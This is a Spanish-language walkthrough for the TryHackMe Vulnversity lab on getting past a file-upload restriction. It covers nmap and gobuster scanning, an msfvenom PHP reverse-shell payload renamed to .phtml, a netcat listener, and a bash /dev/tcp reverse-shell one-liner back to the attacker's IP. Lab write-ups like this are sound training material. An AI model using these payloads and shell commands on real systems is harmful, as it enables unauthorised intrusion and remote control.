# Bypass Restricción de File Upload

Maquinas a utilizar **Kali Linux y** [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

Es posible que en diversas ocasiones no podamos subir directamente un archivo en .php dentro de un panel de subida de archivos, por lo que tenemos que encontrar la forma de hacer un bypass de este tipo de restricciones; y una de las posibles formas es cambiar la extensión de nuestro payload, para que no sea .php pero que a su vez también funcione con php.

- Configuración del laboratorio.
    - Antes de arrancar nuestra Kali Linux ponemos nuestro adaptador de red como adaptador puente . Y arrancamos la maquina.
        
        ![image.png](./imagenes/image%2076.png)
        
    
    - Entramos en la web de la maquina vulnversity  y nos registremos .
    - Nos vamos al botón Access Machines en la parte superior de la pagina.
        
        ![image.png](./imagenes/image%2077.png)
        
    - Escogemos Linux y pulsamos al enlace Download donde nos descargara un archivo para una conexión VPN.
    - Copiamos el archivo al escritorio de nuestra maquina Kali Linux.
    - Abrimos un terminal y ejecutamos el siguiente comando como **root**.
        
        ![image.png](./imagenes/image%2078.png)
        
        ![image.png](./imagenes/image%2079.png)
        
    
    - Pulsamos en Start Machine
        
        ![image.png](./imagenes/image%2080.png)
        
    
    - Esperamos hasta que nos muestre la IP de nuestra maquina victima.
        
        ![image.png](./imagenes/image%2081.png)
        
    - Sin cerrar el terminal que tenemos abierto. Abrimos otra terminal en nuestra maquina Kali. y hacemos un ping a nuestra maquina victima para verificar la conectividad.
        
        ```bash
        ping -c 1 10.10.191.250 
        ```
        
        ![image.png](./imagenes/image%2082.png)
        
    - Como estamos a través de un VPN si hacemos un `ifconfig` nos mostrara una **nueva interface de red** llamada **turn0**. Que es la que vamos a utilizar y nuestra IP será en mi caso **10.21.166.149.**
        
        ![image.png](./imagenes/image%2083.png)
        

---

- Vamos hacer un nmap a la maquina victima.
    
    ```bash
    nmap -p- -sS -sV -sC --open -min-rate 5000 -n -vvv -Pn 10.10.191.250
    ```
    
    ![image.png](./imagenes/image%2084.png)
    
    Nos fijamos que tiene levantado un **servidor web en el puerto 3333**.
    
- Abrimos el navegador y copiamos la IP de la maquina victima en la URL. Pero como el servidor web no esta corriendo por el puerto 80 que es el de por defecto debemos indicarle el puerto.
    
    **`http://10.10.191.250:3333/`**
    
    ![image.png](./imagenes/image%2085.png)
    

- Hacemos **Fuzzing Web** utilizando la IP de la maquina victima y el puerto donde esta corriendo el servidor web.
    
    ```bash
    gobuster dir -u http://10.10.191.250:3333/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    ```
    
    ![image.png](./imagenes/image%2086.png)
    
    Nos encontró un directorio que se llama internal
    
- Probamos la URL en el navegador web
    
    ![image.png](./imagenes/image%2087.png)
    

Tenemos un panel de subidas de archivos. Podríamos crear un php malicioso con msfvenom para tener control remoto de la maquina. Pero esto en ocasionas no es posible por que la web tiene algún tipo de limitador que impide subir archivos en php, algo normal por que dejar subir archivos php es un fallo de seguridad.

Vamos a intentar hacer un bypass a esta limitación.

- Creamos con msfvenom un playload con extensión php.
    
    ```bash
    msfvenom -p php/reverse_php LHOST=10.21.166.149 LPORT=443 -f raw > pwned2.php 
    ```
    
    ![image.png](./imagenes/image%2088.png)
    
- Le cambiamos **la extensión a phtml que a efectos prácticos seria como si fuera php.**
    
    ```bash
    mv pwned2.php pwned2.phtml
    ```
    
    ![image.png](./imagenes/image%2089.png)
    

- Vamos a subirlo por la pagina web.
    
    ![image.png](./imagenes/image%2090.png)
    

- Volvemos a hacer  **Fuzzing Web** pero esa vez dentro del directorio **internal** para ver si encontramos donde guarda los archivos.
    
    ```bash
    gobuster dir -u http://10.10.191.250:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    ```
    
    ![image.png](./imagenes/image%2091.png)
    

- Escribimos en el navegador la URL `http://10.10.191.250:3333/internal/uploads/`
    
    ![image.png](./imagenes/image%2092.png)
    
- Ponemos netcat a la escucha en el puerto que habíamos escogido en msfvenom.
    
    ```bash
    nc -nlvp 443
    ```
    

- Ejecutamos nuestro archivo en el navegador y tendríamos la conexión
    
    ![image.png](./imagenes/image%2093.png)
    
- Recordemos que las conexiones con netcat y msfvenom no duran mucho tiempo así que tenemos que estabilizarla.
    - En otra terminal nos ponemos a la escucha en otro puerto , por ejemplo en el 444
    - Usaremos la web [**Online - Reverse Shell Generator](./imagenes/https://www.revshells.com/)** para crear la revershell.
        
        ![image.png](./imagenes/image%2094.png)
        
    - En la conexión del puerto 443 escribimos lo siguiente:
        
        `bash -c "**sh** -i >& /dev/tcp/**10.21.166.149**/**444** 0>&1"`
        
        ![image.png](./imagenes/image%2095.png)
        
    
    - Ya tendíamos una conexión estable.
        
        ![image.png](./imagenes/image%2096.png)